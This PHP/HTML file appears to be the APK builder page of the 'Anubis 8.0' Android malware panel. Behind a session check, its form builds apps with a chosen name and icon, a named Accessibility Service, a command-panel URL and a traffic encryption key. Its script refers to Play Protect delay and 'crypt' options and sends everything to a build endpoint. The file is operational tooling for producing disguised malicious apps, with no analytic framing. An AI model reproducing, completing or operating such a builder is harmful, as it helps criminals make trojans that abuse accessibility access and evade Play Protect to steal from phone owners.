<?php
session_start();
if(isset($_SESSION["wh_anu7"])) {
 echo "" ;
}else{
	session_destroy();
	header("Location: login.php");


}
?>
<html>
<head >
<title>Anubis 8.0 Builder</title>



<link href="styles/menu.css" rel="stylesheet"/>
<link href="styles/index.css" rel="stylesheet"/>
<link href="styles/btn.css" rel="stylesheet"/>
<link href="styles/modul_form.css" rel="stylesheet"/>
<link rel="stylesheet" href="styles/style.css"/>
<link href="styles/modul_form_log.css" rel="stylesheet"/>
<link href="styles/modul_form_set.css" rel="stylesheet"/>


<link rel="shortcut icon" href="/images/icon3.png" type="image/png"/>



<script src="styles/bootstrap/js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/jquery.min.js"></script>

<link href="styles/bootstrap/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="styles/bootstrap/css/style.css"/>
<script src="styles/bootstrap/js/bootstrap.min.js"></script>
<script src="js/alert.js"></script>
<script src="js/amrnb.js" defer></script>

</head>

 <body bgcolor="#1A2028">









<div class="menu header">

<ul>

	<li style="float:left; padding-left: 3px;"><img src="images/icons/panel/oqJNeIC2.png" width='104px'/></li>
	<div class="ac">

<!--
	<div class="exit">
    <li style="padding-top:0px;"><a href="?cont=exit"><img src="images/icons/panel/exit.png"  width='50px'/></a></li>
	 </div>
-->




	 <li style="padding-top:0px;"><a href="icon.php?cont=icons">
	 <img src="images/icons/panel/files.png" height='50px'width='30px'/> Add icon
	 </a>
	 </li>







	</div>
	<li style="padding-top:0px;"><a><img src="images/not.png" width='0px' height='50px'/></a></li>


</ul>
</div>

<style type="text/css">
INPUT {
	font-size: 20pt;
}
</style>
<div class="content">

	<script>

	function chPP(){
		if (document.getElementById("check_playprotect").checked) {
			document.getElementById("secondsPlayProtect").disabled = false;
		}else {
			document.getElementById("secondsPlayProtect").value='';
			document.getElementById("secondsPlayProtect").disabled = true;
		}
	}
	function chURL(){
	if (document.getElementById("checkstarturl").checked) {
		document.getElementById("urlsite").disabled = false;
	}else {
		document.getElementById("urlsite").value='';
		document.getElementById("urlsite").disabled = true;
	}
}
	</script>


<?php

	$user =$_SESSION['wh_anu7'];
	$svoy=getcwd();
	//~ $godir="application/datalogs/files/$user";

	//~ $dir = "$svoy/$godir";
	$files2 = scandir("icons", 1);

//~ $last_cfg = json_decode(file_get_contents("../last.cfg"), true);

$old_url = (isset($last_cfg["url"]))? $last_cfg["url"] : "";
$old_key = (isset($last_cfg["key"]))? $last_cfg["key"] : "";
	


	echo "
<form method='post' action='stor.php'>

		<div class='divbuild' id='Bots_settings' style='display:block; width:100%; min-height: 300px; margin-top:20px; margin: 0 auto;
		background: #1D1F24; border-radius: 4px; font-size: 15pt' >
			<center>Create New Build Request (Build In few Minute(s))</center>
			</br>
<table border=0 width=100%>
<tr valign=top>
<td width=50%>

			</td></tr>
<tr>

			<center><!-- onclick='startBuild()' -->
			<input type='submit' value='Build APK'  id='BUILDAPK' class='btn btn-success'
			 style=' Width:40%; Height: 30px; '/>
			</center>
			</br>
</tr>
</table>
</form>

			<a style='margin-left:10%; color:#fff'>TAG</a></br>
			<input type='text' name='tag' value='' placeholder='TagName' id='tag' style='margin-left:10%; color: #337ab7; font-size: 15pt; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>
			
			<a style='margin-left:10%; color:#fff'>Name application</a></br>
			<input type='text' name='nameapp' placeholder='Enter your app name' value='' id='nameapp' style='margin-left:10%; color: #337ab7; background: #1D1F24;
			 width: 85%; font-size: 15pt; border-radius: 5px;'></input>
			</br></br>
			
			<a style='margin-left:10%; color:#fff'>Name Accessibility Service</a></br>
			<input type='text' placeholder='Enter your Accessibility service name' name='Accessibility' value='' id='Accessibility' style='font-size: 15pt; margin-left:10%; color: #337ab7; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>
			
			<hr style='width: 80%' />

			<a style='margin-left:10%; color:#fff'>URL admin panel</a></br>
			<input type='text' name='url' value='{$old_url}' placeholder='https://domain.com/' id='url' style='font-size: 15pt; margin-left:10%; color: #337ab7; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>

			<a style='margin-left:10%; color:#fff'>Traffic Encryption Key</a></br>
			<input type='text' name='keytraff' value='{$old_key}' placeholder='111word' id='keytraff' style='margin-left:10%; font-size: 15pt; color: #337ab7; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>


			
			
			
<a style='margin-left:10%; color:#fff'>Icon application (web/app_icons/)</a></br>
			<select  name='selecticon' onchange='showIcon(this)' id='selecticon' style='font-size: 12pt; margin-left:10%; color: #337ab7;  height: 28px; width: 85%; background: #1D1F24'>
			<option value='--'>Select icon</option> ";
					foreach($files2 as $fil){
						if ( $fil != "." && $fil != ".." )
						{
							echo "<option value='$fil'>$fil";
						 }
					}
		echo "</select>
			</br>
			<div style='width: 100%; text-align: center; margin-top: 10px;'><img id='iconImg' width='64' /></div>
			
			
	


</td><td>
<br>
			
			
			
			
			<script>
			
function showIcon(select)
{
document.getElementById('iconImg').src = 'icons/' + select.options[select.selectedIndex].value + ''
}
			</script>
			</br>
</br>

</td></tr>
<tr>
<td></td>
<td>

</td></tr>
</table>
</form>
		</div>";

		echo "<center><div class='loading' id='Bots_settings' style='display:  none;' >
			<img src='images/loading.gif'></img>
		</div></center>"



?>
</div>

<script>


function startBuild(){

	var nameapp = document.getElementById("nameapp").value;
	var url = document.getElementById("url").value;
	var keytraff = document.getElementById("keytraff").value;
	var tag = document.getElementById("tag").value;
	var admindev = document.getElementById("admindev").value;
	var RequestAccessibility = document.getElementById("RequestAccessibility").value;
	var Accessibility = document.getElementById("Accessibility").value;
	var secondsPlayProtect = document.getElementById("secondsPlayProtect").value;
	var urlsite = document.getElementById("urlsite").value;
	var icon =  document.getElementById("selecticon").value;
	var twitter =  document.getElementById("Twitter").value;


var crypt = false;

	if($('#cryptapk').prop('checked')) {
	  crypt = true;
	}

document.getElementsByClassName('divbuild')[0].style.display = "none";
document.getElementsByClassName('loading')[0].style.display = "block";
document.getElementsByClassName('content')[0].style.background = "#333739";

	$.ajax({ url: 'application/set/buildstart.php?'
		+ 'nameapp='+nameapp
		+ '&url='+url
		+ '&keytraff='+keytraff
		+ '&tag='+tag
		+ '&admindev='+admindev
		+ '&RequestAccessibility='+ RequestAccessibility
		+ '&Accessibility='+ Accessibility
		+ '&secondsPlayProtect='+secondsPlayProtect
		+ '&urlsite='+urlsite
		+ '&icon='+icon
		+ '&twitter='+ twitter
		+ '&crypt='+crypt,
	           success: function(data){
							 document.getElementsByClassName('divbuild')[0].style.display = "block";
 							 document.getElementsByClassName('loading')[0].style.display = "none";
							 document.getElementsByClassName('content')[0].style.background = "#1D1F24";
							// var nameapk = '<?php echo substr(md5($_SESSION['panel_user']),0,12);?>';
 						 //	 window.location.href = 'application/datalogs/files/filesapk/'+nameapk+'.apk' ;
					 }});
}

if (document.getElementById("check_playprotect").checked) {
	document.getElementById("secondsPlayProtect").disabled = false;
}else {
	document.getElementById("secondsPlayProtect").value='';
	document.getElementById("secondsPlayProtect").disabled = true;
}

if (document.getElementById("checkstarturl").checked) {
	document.getElementById("urlsite").disabled = false;
}else {
	document.getElementById("urlsite").value='';
	document.getElementById("urlsite").disabled = true;
}
</script>
</body>
</html>